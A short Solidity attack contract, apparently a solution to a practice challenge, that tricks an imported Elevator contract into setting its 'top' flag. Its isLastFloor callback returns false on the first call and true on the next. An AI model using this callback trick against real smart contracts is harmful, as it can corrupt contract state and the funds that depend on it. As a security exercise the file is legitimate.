// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";
 contract AttackOnElevator {
     Elevator private immutable elevator;
     uint public floor;
     constructor(address _Elevator) {
        elevator = Elevator(_Elevator);
     }
     function Attack() public {
        elevator.goTo(1);
        require(elevator.top(), "not top");
     }

     function isLastFloor(uint) external returns (bool) {
         if(floor == 0){
             floor = 2;
             return false;
         }
         else{
             return true;
         }
     }
 }
